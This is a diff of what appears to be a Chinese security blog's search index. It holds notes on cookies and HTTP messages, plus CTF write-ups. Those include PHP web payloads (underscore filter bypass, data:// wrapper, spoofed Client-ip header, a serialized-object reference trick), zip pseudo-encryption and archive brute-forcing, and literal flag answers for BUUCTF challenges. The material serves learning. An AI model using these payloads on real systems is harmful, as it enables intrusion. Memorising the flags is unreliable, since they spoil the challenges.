 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure>
-
-
-
 <p><strong>注：当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端</strong>。</p>
 <p>如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止<strong>会话固定攻击</strong>（session fixation attacks），在该攻击中第三方可以重用用户的会话。</p>
-<h2 id="限制访问-Cookie"><a href="#限制访问-Cookie" class="headerlink" title="限制访问 Cookie"></a>限制访问 Cookie</h2><p>有两种方法可以确保 <code>Cookie</code>被安全发送，并且不会被意外的参与者或脚本访问：<code>Secure</code>属性和<code>HttpOnly</code>属性。</p>
+<h2 id="限制访问-Cookie">限制访问 Cookie</h2>
+<p>有两种方法可以确保 <code>Cookie</code>被安全发送，并且不会被意外的参与者或脚本访问：<code>Secure</code>属性和<code>HttpOnly</code>属性。</p>
 <blockquote>
 <p>标记为 <code>Secure</code>的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 m<strong>an-in-the-middle</strong> 攻击者的攻击。但即便设置了 <code>Secure</code>标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，<code>Secure</code>标记也无法提供确实的安全保障, 例如，可以访问客户端硬盘的人可以读取它。</p>
 </blockquote>
-<h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><blockquote>
+<h2 id="安全">安全</h2>
+<blockquote>
 <p>信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。</p>
 <p>当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。</p>
 </blockquote>
@@ -1082,18 +1083,17 @@
     <url>/2021/08/29/BUUCTF-MRC-MRCTF2020-%E5%A5%97%E5%A8%83/</url>
     <content><![CDATA[<p>打开靶机：</p>
 <p><img src="https://image.3001.net/images/20210622/1624366948_60d1df640965096e14444.png!small" alt="1624366948_60d1df640965096e14444.png!small"></p>
-<span id="more"></span>
-
-<p>查看源码发现<strong>代码：</strong></p>
+<p>查看源码发现<strong>代码：</strong><span id="more"></span></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;</span><br><span class="line">    die(&#x27;Y0u are So cutE!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p><strong>解析：</strong></p>
 <blockquote>
-<p>第一个if判断传参的字符串，不能有_和%5f<br>绕过：PHP会将传参中的空格( )、小数点(.)自动替换成下划线<br>第二个if判断get传参b_u_p_t不等于23333 并且开头和结尾和中间必须是23333<br>绕过：在23333结尾加个换行符url编码为%0a 即可绕过，</p>
+<p>第一个if判断传参的字符串，不能有_和%5f<br>
+绕过：PHP会将传参中的空格( )、小数点(.)自动替换成下划线<br>
+第二个if判断get传参b_u_p_t不等于23333 并且开头和结尾和中间必须是23333<br>
+绕过：在23333结尾加个换行符url编码为%0a 即可绕过，</p>
 </blockquote>
 <p><strong>paylaod:</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) ?b.u.p.t=23333%0a</span><br><span class="line">2) ?b u p t=23333%0a</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://image.3001.net/images/20210623/1624412864_60d292c039f529dec7496.png!small" alt="1624412864_60d292c039f529dec7496.png!small"></p>
 <blockquote>
 <p>发现 <strong>secrettw.php</strong></p>
@@ -1107,21 +1107,19 @@
 <p><img src="https://image.3001.net/images/20210623/1624413926_60d296e68ca92fdd18e46.png!small" alt="1624413926_60d296e68ca92fdd18e46.png!small"></p>
 <p>解码得</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post me Merak</span><br></pre></td></tr></table></figure>
-
 <p>随便用POST方法给Merak一个值</p>
 <p><img src="https://image.3001.net/images/20210623/1624413926_60d296e689fee5fc41be1.png!small" alt="1624413926_60d296e689fee5fc41be1.png!small"></p>
 <p>发现代码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it? &lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#x27;takeip.php&#x27;;</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); </span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;Merak&#x27;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = &#x27;&#x27;; </span><br><span class="line">    for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">$ip = getIp();</span><br><span class="line">if($ip!=&#x27;127.0.0.1&#x27;)</span><br><span class="line">echo &quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
 <p><strong>代码解析</strong>：</p>
 <blockquote>
 <p>1、来源ip是127.0.0.1 用<strong>Client-ip</strong></p>
-<p>2、get参数2333传来的值，使用文件流打开后内容为<code>todat is a happy day</code><br>3、file_get_contents用php伪协议绕过</p>
+<p>2、get参数2333传来的值，使用文件流打开后内容为<code>todat is a happy day</code><br>
+3、file_get_contents用php伪协议绕过</p>
 <p>4.反写change加密函数</p>
 </blockquote>
 <p>反写 exp:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
 <?php
 function unchange($v){
 
@@ -1136,11 +1134,10 @@ $real_flag = unchange('flag.php');
 
 echo base64_encode($real_flag);
 ?>
-
 <p><img src="https://image.3001.net/images/20210623/1624415080_60d29b68d3c443859a174.png!small" alt="1624415080_60d29b68d3c443859a174.png!small"></p>
 <p>最后<strong>payload：</strong></p>
 <blockquote>
-<p><strong>?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</strong> </p>
+<p><strong>?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</strong></p>
 <p><strong>Client-ip : 127.0.0.1</strong></p>
 </blockquote>
 <p><img src="https://image.3001.net/images/20210623/1624415212_60d29bec289f13bc381f5.png!small" alt="1624415212_60d29bec289f13bc381f5.png!small"></p>
@@ -1525,17 +1522,18 @@ echo base64_encode($real_flag);
   <entry>
     <title>湖南科技学院2021 反序列化</title>
     <url>/2021/08/29/%E6%B9%96%E5%8D%97%E7%A7%91%E6%8A%80%E5%AD%A6%E9%99%A22021-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<h2 id="进入目标网址得代码："><a href="#进入目标网址得代码：" class="headerlink" title="进入目标网址得代码："></a>进入目标网址得代码：</h2><p><img src="https://image.3001.net/images/20210627/1624792831_60d85eff3d2fba5fb5109.png!small?1624792831507" alt="1624792831_60d85eff3d2fba5fb5109.png!small?1624792831507"></p>
-<span id="more"></span>
-
-<h2 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a><strong>代码分析：</strong></h2><blockquote>
+    <content><![CDATA[<p>进入目标站点：</p>
+<p><img src="https://image.3001.net/images/20210627/1624792831_60d85eff3d2fba5fb5109.png!small?1624792831507" alt="1624792831_60d85eff3d2fba5fb5109.png!small?1624792831507"></p>
+<h2 id="more-代码分析："><span id="more"></span><strong>代码分析：</strong></h2>
+<blockquote>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class User</span><br><span class="line">&#123;</span><br><span class="line">private $userData;</span><br><span class="line"></span><br><span class="line">public function __construct($loginAttempt)  //创建对象时调用  将值传给loginAttempt</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;userData = unserialize($loginAttempt);  //调用反序列化</span><br><span class="line">if (!$this-&gt;userData)</span><br><span class="line">throw new InvalidArgumentException(&#x27;Unable to reconstruct user data&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private function verifyUsername()</span><br><span class="line">&#123;</span><br><span class="line">return $this-&gt;userData-&gt;username === &#x27;husectfer&#x27;;  //判断username</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private function verifyRandomVal()</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;userData-&gt;randomValue = random_int(1e10, 1e11 - 1);</span><br><span class="line">return (int)$this-&gt;userData-&gt;rnd === $this-&gt;userData-&gt;randomValue;  </span><br><span class="line">&#125;  //构造 return放回结果为真</span><br><span class="line"></span><br><span class="line">public function verify()</span><br><span class="line">&#123;</span><br><span class="line">if (!$this-&gt;verifyUsername())   //调用verifyUsername() 判断</span><br><span class="line">throw new InvalidArgumentException(&#x27;Invalid username&#x27;);</span><br><span class="line"></span><br><span class="line">if (!$this-&gt;verifyRandomVal())//调用verifyRandomVal() 判断</span><br><span class="line">throw new InvalidArgumentException(&#x27;Invalid random token value&#x27;);</span><br><span class="line"></span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;var&#x27;])) &#123;</span><br><span class="line">$var = base64_decode($_GET[&#x27;var&#x27;]);  //base64解码</span><br><span class="line">$user = new User($var);   //创建一个新的user类</span><br><span class="line">if ($user-&gt;verify()) &#123;  //如果verify验证通过放出flag 要同时满足 v和v1函数</span><br><span class="line">highlight_file(&quot;flag.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">highlight_file(&quot;index.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <p>代码审计要构造</p>
 <blockquote>
 <p><strong>username === husectfer rnd=randomValue</strong></p>
 </blockquote>
-<h2 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h2><blockquote>
+<h2 id="构造代码">构造代码</h2>
+<blockquote>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x = array();</span><br><span class="line"></span><br><span class="line">$x[&#x27;username&#x27;] = &quot;husectfer&quot;;</span><br><span class="line">$x[&#x27;randomValue&#x27;] = random_int(1e10, 1e11 - 1);</span><br><span class="line">$x[&#x27;randomValue&#x27;] = 0;</span><br><span class="line">$x[&#x27;rnd&#x27;] = &amp;$x[&#x27;randomValue&#x27;]; //将randomValue的地址赋给rnd使其达到相等目的</span><br><span class="line"></span><br><span class="line">echo (serialize((object)$x)); //object 将其他类转换为对象</span><br><span class="line">echo base64_encode(serialize((object)$x));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <p><img src="https://image.3001.net/images/20210627/1624793575_60d861e7f053e3e25dbc3.png!small?1624793576256" alt="1624793575_60d861e7f053e3e25dbc3.png!small?1624793576256"></p>
@@ -1549,12 +1547,12 @@ echo base64_encode($real_flag);
       </tags>
   </entry>
   <entry>
-    <title>http消息</title>
+    <title>HTTP消息</title>
     <url>/2021/10/24/HTTP%E6%B6%88%E6%81%AF/</url>
-    <content><![CDATA[<h2 id="HTTP消息"><a href="#HTTP消息" class="headerlink" title="HTTP消息"></a>HTTP消息</h2><blockquote>
+    <content><![CDATA[<h2 id="HTTP消息">HTTP消息</h2>
+<blockquote>
 <p><strong>HTTP消息是服务器和客户端之间交换数据的方式</strong>。</p>
 <span id="more"></span>
-
 <p>有两种类型的消息︰ <strong>请求</strong>（requests）–由客户端发送用来触发一个服务器上的动作；</p>
 <p><strong>响应</strong>（responses）–来自服务器的应答。</p>
 </blockquote>
@@ -1567,13 +1565,16 @@ echo base64_encode($real_flag);
 <p><strong>起始行和HTTP消息中的HTTP头统称为请求头，而其有效负载被称为消息正文.</strong></p>
 </blockquote>
 <p><img src="https://image.3001.net/images/20210621/1624276378_60d07d9a0c126677fefd1.png!small?1624276377446" alt="1624276378_60d07d9a0c126677fefd1.png!small?1624276377446"></p>
-<h2 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h2><p><strong>HTTP请求是由客户端发出的消息，用来使服务器执行动作。</strong></p>
-<h3 id="起始行"><a href="#起始行" class="headerlink" title="起始行"></a>起始行</h3><blockquote>
+<h2 id="HTTP请求">HTTP请求</h2>
+<p><strong>HTTP请求是由客户端发出的消息，用来使服务器执行动作。</strong></p>
+<h3 id="起始行">起始行</h3>
+<blockquote>
 <p>1.一个<a href="https://www.freebuf.com/articles/articles/web/278085.html">HTTP 方法</a>，一个动词 (像 GET,PSOT或PUT) 或者一个名词 (像HEAD或者OPTIONS) , 描述要执行的动作。</p>
 <p>2.请求目标 (request target)，通常是一个 URL，或者是协议、端口和域名的绝对路径，通常以请求的环境为特征。请求的格式因不同的 HTTP 方法而异。</p>
 <p>3.HTTP 版本 (HTTP version)，定义了剩余报文的结构，作为对期望的响应版本的指示符。</p>
 </blockquote>
-<h3 id="Headers"><a href="#Headers" class="headerlink" title="Headers"></a>Headers</h3><p>来自请求的 HTTP headers 遵循和 HTTP header 相同的基本结构：不区分大小写的字符串，紧跟着的冒号 (‘:’) 和一个结构取决于 header 的值。</p>
+<h3 id="Headers">Headers</h3>
+<p>来自请求的 HTTP headers 遵循和 HTTP header 相同的基本结构：不区分大小写的字符串，紧跟着的冒号 (‘:’) 和一个结构取决于 header 的值。</p>
 <p>整个 header（包括值）由一行组成，这一行可以相当长。</p>
 <p>有许多请求头可用，它们可以分为几组：</p>
 <blockquote>
@@ -1582,20 +1583,24 @@ echo base64_encode($real_flag);
 <p>Entity headers，例如 Content-Length，适用于请求的 body。显然，如果请求中没有任何 body，则不会发送这样的头文件。</p>
 </blockquote>
 <p><img src="https://image.3001.net/images/20210622/1624362359_60d1cd77db3895bbc5123.png!small?1624362360094" alt="1624362359_60d1cd77db3895bbc5123.png!small?1624362360094"></p>
-<h3 id="body"><a href="#body" class="headerlink" title="body"></a>body</h3><p>请求的最后一部分是它的 body。<strong>不是所有的请求都有一个 body</strong>：例如获取资源的请求，GET，HEAD，DELETE 和 OPTIONS，通常它们不需要 body。 有些请求将数据发送到服务器以便更新数据：常见的的情况是 POST 请求（包含 HTML 表单数据）。</p>
+<h3 id="body">body</h3>
+<p>请求的最后一部分是它的 body。<strong>不是所有的请求都有一个 body</strong>：例如获取资源的请求，GET，HEAD，DELETE 和 OPTIONS，通常它们不需要 body。 有些请求将数据发送到服务器以便更新数据：常见的的情况是 POST 请求（包含 HTML 表单数据）。</p>
 <p>Body 大致可分为两类：</p>
 <blockquote>
 <p>Single-resource bodies，由一个单文件组成。该类型 body 由两个 header 定义： Content-Type和 Content-Length.</p>
 <p>Multiple-resource bodies，由多部分 body 组成，每一部分包含不同的信息位。通常是和  HTML Forms 连系在一起。</p>
 </blockquote>
-<h2 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h2><h3 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h3><blockquote>
+<h2 id="HTTP响应">HTTP响应</h2>
+<h3 id="状态行">状态行</h3>
+<blockquote>
 <p>HTTP 响应的起始行被称作 状态行 (status line)，包含以下信息：</p>
 <p>1.协议版本，通常为 HTTP/1.1。</p>
 <p>2.状态码 (status code)，表明请求是成功或失败。常见的状态码是 <a href="https://www.freebuf.com/articles/articles/web/278160.html">200</a>，<a href="https://www.freebuf.com/articles/articles/web/278160.html">404</a>，或 <a href="https://www.freebuf.com/articles/articles/web/278160.html">302</a>。</p>
 <p>3.状态文本 (status text)。一个简短的，纯粹的信息，通过状态码的文本描述，帮助人们理解该 HTTP 消息。</p>
 <p>一个典型的状态行看起来像这样：HTTP/1.1 404 Not Found。</p>
 </blockquote>
-<h3 id="Headers-1"><a href="#Headers-1" class="headerlink" title="Headers"></a>Headers</h3><p>响应的  HTTP headers 遵循和任何其它 header 相同的结构：不区分大小写的字符串，紧跟着的冒号 (<code>&#39;:&#39;</code>) 和一个结构取决于 header 类型的值。 整个 header（包括其值）表现为单行形式。</p>
+<h3 id="Headers-2">Headers</h3>
+<p>响应的  HTTP headers 遵循和任何其它 header 相同的结构：不区分大小写的字符串，紧跟着的冒号 (<code>':'</code>) 和一个结构取决于 header 类型的值。 整个 header（包括其值）表现为单行形式。</p>
 <p>有许多响应头可用，这些响应头可以分为几组：</p>
 <blockquote>
 <p>General headers，例如 Via，适用于整个报文。</p>
@@ -1603,7 +1608,8 @@ echo base64_encode($real_flag);
 <p>Entity headers，例如 Content-Length，适用于请求的 body。显然，如果请求中没有任何 body，则不会发送这样的头文件。</p>
 </blockquote>
 <p><img src="https://image.3001.net/images/20210622/1624362998_60d1cff607b3e8ea2a098.png!small?1624362998240" alt="1624362998_60d1cff607b3e8ea2a098.png!small?1624362998240"></p>
-<h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p><strong>响应的最后一部分是 body。不是所有的响应都有 body：具有状态码 (如 <a href="https://www.freebuf.com/articles/articles/web/278160.html"><code>201</code></a>或 <a href="https://www.freebuf.com/articles/articles/web/278160.html"><code>204</code></a>) 的响应，通常不会有 body。</strong></p>
+<h3 id="Body">Body</h3>
+<p><strong>响应的最后一部分是 body。不是所有的响应都有 body：具有状态码 (如 <a href="https://www.freebuf.com/articles/articles/web/278160.html"><code>201</code></a>或 <a href="https://www.freebuf.com/articles/articles/web/278160.html"><code>204</code></a>) 的响应，通常不会有 body。</strong></p>
 <p>Body 大致可分为三类：</p>
 <blockquote>
 <p>Single-resource bodies，由已知长度的单个文件组成。该类型 body 由两个 header 定义：Content-Type和 Content-Length。</p>
@@ -1622,40 +1628,47 @@ echo base64_encode($real_flag);
   <entry>
     <title>BUUCTF MISC 一</title>
     <url>/2021/08/11/BUUCTF-MISC-%E4%B8%80/</url>
-    <content><![CDATA[<h2 id="BUUCTF-MISC-WP-一"><a href="#BUUCTF-MISC-WP-一" class="headerlink" title="BUUCTF MISC WP(一)"></a>BUUCTF MISC WP(一)</h2><p>做CTF MISC,我们要了解<a href="https://blog.csdn.net/dyw_666666/article/details/89973048">CTF必备密码编码大全</a>。</p>
+    <content><![CDATA[<h2 id="BUUCTF-MISC-WP-一">BUUCTF MISC WP(一)</h2>
+<p>做CTF MISC,我们要了解<a href="https://blog.csdn.net/dyw_666666/article/details/89973048">CTF必备密码编码大全</a>。</p>
 <p><a href="https://www.freebuf.com/sectool/282074.html">主要的CTF MISC工具下载</a>。</p>
 <span id="more"></span>
-
-
-
-<h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p><a href="https://tu.sioe.cn/gj/fenjie/">gif图片在线分解</a></p>
+<h2 id="金三胖">金三胖</h2>
+<p><a href="https://tu.sioe.cn/gj/fenjie/">gif图片在线分解</a></p>
 <p>flag:<code>flag&#123;he11ohongke&#125;</code></p>
-<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>扫描二维码显示secret is here，binwalk -e分解一下，有个压缩包，</p>
+<h2 id="二维码">二维码</h2>
+<p>扫描二维码显示secret is here，binwalk -e分解一下，有个压缩包，</p>
 <p>注:<strong>binwalk下载</strong></p>
 <p><a href="https://www.cnblogs.com/0yst3r-2046/p/12218770.html">binwalk在Windows10和kali_Linux下的安装及使用教程</a></p>
 <p><a href="http://yll0024.xyz/images/pasted-77.png"><img src="http://yll0024.xyz/images/pasted-77.png" alt="玖涯博客"></a></p>
 <p>根据提示，压缩包密码是四位数字，用Advanced Archive Password Recovery爆破就行了</p>
 <p><a href="http://yll0024.xyz/images/pasted-78.png"><img src="http://yll0024.xyz/images/pasted-78.png" alt="玖涯博客"></a></p>
 <p>flag:<code>flag&#123;vjpw_wnoei&#125;</code></p>
-<h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>里面有个KEY.exe，直接运行不了，用winhex看一下</p>
+<h2 id="N种方法解决">N种方法解决</h2>
+<p>里面有个KEY.exe，直接运行不了，用winhex看一下</p>
 <p><a href="http://yll0024.xyz/images/pasted-79.png"><img src="http://yll0024.xyz/images/pasted-79.png" alt="玖涯博客"></a></p>
-<p>emmm，base64转图片（<a href="http://tool.chinaz.com/tools/imgtobase">在线base64转图片</a>）,把内容全复制进去，转出一张二维码，扫一下就有了(按照格式，最前面用flag包裹)。<br><code>flag&#123;dca57f966e4e4e31fd5b15417da63269&#125;</code></p>
-<h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>用Stegsolve分析一下File format就行了,注意去掉多余的空格</p>
+<p>emmm，base64转图片（<a href="http://tool.chinaz.com/tools/imgtobase">在线base64转图片</a>）,把内容全复制进去，转出一张二维码，扫一下就有了(按照格式，最前面用flag包裹)。<br>
+<code>flag&#123;dca57f966e4e4e31fd5b15417da63269&#125;</code></p>
+<h2 id="你竟然赶我走">你竟然赶我走</h2>
+<p>用Stegsolve分析一下File format就行了,注意去掉多余的空格</p>
 <p><a href="http://yll0024.xyz/images/pasted-82.png"><img src="http://yll0024.xyz/images/pasted-82.png" alt="玖涯博客"></a></p>
 <p>flag:<code>flag&#123;stego_is_s0_bor1ing&#125;</code></p>
-<h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>这个一开始方向做错了，我先用binwalk分解，分解出了一个zlib，后面尝试解压zlib失败，然后我用winhex看了一下，发现这是一张完整的图片，因为文件头是89 50 4E 47，文件尾是IEND，这是标准的png文件结构，然后尝试修改图片高度(一般png格式的图片可能考修改图片高度)</p>
+<h2 id="大白">大白</h2>
+<p>这个一开始方向做错了，我先用binwalk分解，分解出了一个zlib，后面尝试解压zlib失败，然后我用winhex看了一下，发现这是一张完整的图片，因为文件头是89 50 4E 47，文件尾是IEND，这是标准的png文件结构，然后尝试修改图片高度(一般png格式的图片可能考修改图片高度)</p>
 <p><a href="http://yll0024.xyz/images/pasted-80.png"><img src="http://yll0024.xyz/images/pasted-80.png" alt="玖涯博客"></a></p>
 <p>如图所示第二行六七个字节是文件高度，把第六个字节稍微改大点就行了，改的太大会看不到图片</p>
 <p><a href="http://yll0024.xyz/images/pasted-81.png"><img src="http://yll0024.xyz/images/pasted-81.png" alt="玖涯博客"></a></p>
 <p>得到flag:<code>flag&#123;He1l0_d4_ba1&#125;</code></p>
-<h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>简单的爆破，4位数字，用Advanced Archive Password Recovery跑一下</p>
+<h2 id="基础破解">基础破解</h2>
+<p>简单的爆破，4位数字，用Advanced Archive Password Recovery跑一下</p>
 <p><a href="http://yll0024.xyz/images/pasted-83.png"><img src="http://yll0024.xyz/images/pasted-83.png" alt="玖涯博客"></a></p>
 <p>然后base64解密一下就行了<a href="http://tool.chinaz.com/Tools/Base64.aspx">base64在线解密</a></p>
 <p>flag:<code>flag&#123;70354300a5100ba78068805661b93a5c&#125;</code></p>
-<h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>binwalk分离一下，没有其他文件，看一下属性-&gt;详细信息（exif）也没什么信息，继续用Stegsolve分析一下File format，在最后找到flag(去掉多余的空格)</p>
+<h2 id="乌镇峰会种图">乌镇峰会种图</h2>
+<p>binwalk分离一下，没有其他文件，看一下属性-&gt;详细信息（exif）也没什么信息，继续用Stegsolve分析一下File format，在最后找到flag(去掉多余的空格)</p>
 <p>flag:<code>flag&#123;97314e7864a8f62627b26f3f998c37f1&#125;</code></p>
 <p><a href="http://yll0024.xyz/images/pasted-84.png"><img src="http://yll0024.xyz/images/pasted-84.png" alt="玖涯博客"></a></p>
-<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>最低有效位隐写，可用Stegsolve手动慢慢找，也可以用zsteg工具检测</p>
+<h2 id="LSB">LSB</h2>
+<p>最低有效位隐写，可用Stegsolve手动慢慢找，也可以用zsteg工具检测</p>
 <p>kali安装zsteg：gem install zsteg</p>
 <p>zsteg xxx.png/bmp直接把图片检测一下</p>
 <p><a href="http://yll0024.xyz/images/pasted-85.png"><img src="http://yll0024.xyz/images/pasted-85.png" alt="玖涯博客"></a></p>
@@ -1663,24 +1676,44 @@ echo base64_encode($real_flag);
 <p><a href="http://yll0024.xyz/images/pasted-86.png"><img src="http://yll0024.xyz/images/pasted-86.png" alt="玖涯博客"></a></p>
 <p>因为zsteg的bit从1开始，Stegsolve的bit从0开始，所以在Stegsolve中选择Red,Green,Blue的第0位，顺序RGB，LSBfirst，preview一下果然有个png图片，save bin，保存为png格式，出现一张二维码，扫一下获得flag</p>
 <p>flag:<code>flag&#123;1sb_i4_s0_Ea4y&#125;</code></p>
-<h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>flag在exif信息中，右键属性-&gt;详细信息</p>
+<h2 id="文件中的秘密">文件中的秘密</h2>
+<p>flag在exif信息中，右键属性-&gt;详细信息</p>
 <p><a href="http://yll0024.xyz/images/pasted-87.png"><img src="http://yll0024.xyz/images/pasted-87.png" alt="玖涯博客"></a></p>
 <p>flag:<code>flag&#123;870c5a72806115cb5439345d8b014396&#125;</code></p>
-<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>用wireshark打开慢慢找</p>
+<h2 id="wireshark">wireshark</h2>
+<p>用wireshark打开慢慢找</p>
 <p><a href="http://yll0024.xyz/images/pasted-88.png"><img src="http://yll0024.xyz/images/pasted-88.png" alt="玖涯博客"></a></p>
 <p>flag:<code>flag&#123;ffb7567a1d4f4abdffdb54e022f8facd&#125;</code></p>
-<h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>4位数字密码爆破，做过多次了</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>BUUCTF</category>
+        <category>Misc</category>
+      </categories>
+      <tags>
+        <tag>BUU MISC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF-MISC-二</title>
+    <url>/2021/10/25/BUUCTF-MISC-%E4%BA%8C/</url>
+    <content><![CDATA[<h2 id="rar">rar</h2>
+<p>4位数字密码爆破，做过多次了</p>
 <p>flag:<code>flag&#123;1773c5da790bd3caff38e3decd180eb7&#125;</code></p>
-<h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>emmm….扫码就是flag</p>
+<span id="more"></span>
+<h2 id="qr">qr</h2>
+<p>emmm….扫码就是flag</p>
 <p>flag:<code>flag&#123;878865ce73370a4ce607d21ca01b5e59&#125;</code></p>
-<h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>题目标题就给出答案了….winhex打开</p>
+<h2 id="zip伪加密">zip伪加密</h2>
+<p>题目标题就给出答案了….winhex打开</p>
 <p><a href="http://yll0024.xyz/images/pasted-89.png"><img src="http://yll0024.xyz/images/pasted-89.png" alt="玖涯博客"></a></p>
 <p>50 4B 03 04 zip文件头</p>
 <p>14 00 解压文件所需 pkware 版本</p>
 <p>00 00 全局方式位标记（是否有密码，00 00 无密码 09 00 有密码）</p>
 <p>第六个字节改成00</p>
 <p>flag:<code>flag&#123;Adm1N-B2G-kU-SZIP&#125;</code></p>
-<h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>wireshark打开，发现一个POST包很可疑</p>
+<h2 id="被嗅探的流量">被嗅探的流量</h2>
+<p>wireshark打开，发现一个POST包很可疑</p>
 <p><a href="http://yll0024.xyz/images/pasted-91.png"><img src="http://yll0024.xyz/images/pasted-91.png" alt="玖涯博客"></a></p>
 <p>右键追踪TCP流</p>
 <p><a href="http://yll0024.xyz/images/pasted-92.png"><img src="http://yll0024.xyz/images/pasted-92.png" alt="玖涯博客"></a></p>
@@ -1690,125 +1723,177 @@ echo base64_encode($real_flag);
 <p><a href="http://yll0024.xyz/images/pasted-94.png"><img src="http://yll0024.xyz/images/pasted-94.png" alt="玖涯博客"></a></p>
 <p>这次上传了一个JPG文件，在文件流最后发现flag</p>
 <p>flag:<code>flag&#123;da73d88936010da1eeeb36e945ec4b97&#125;</code></p>
